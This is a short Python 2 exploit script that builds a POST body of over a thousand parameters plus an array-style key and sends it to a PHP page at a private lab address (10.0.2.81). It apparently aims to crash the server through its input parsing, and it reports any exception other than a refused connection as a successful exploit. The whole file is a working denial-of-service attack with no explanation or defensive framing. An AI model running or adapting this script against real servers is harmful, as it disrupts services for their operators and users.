#!/usr/bin/env python
import urllib, urllib2

def createObj():
    obj = {}
    for i in range(1001):
        obj[i] = "A"
    obj['A[]'] = 'A'
    return obj
    
def serialize(obj):
    lst = []
    for derp in obj:
        lst.append(str(derp) + '=' + obj[derp])
    return "&".join(lst)
        
if __name__ == "__main__":
    print "Making object..."
    postme = serialize(createObj())
    print "hitting 10.0.2.81..."
    try:
        f = urllib2.urlopen("http://10.0.2.81/test.php", postme)
        f.read()
        print "Exploit failed :("
    except urllib2.URLError:
        print "Connection reufused...No server alive?"
    except: 
        print "Yay exploit worked! :)"

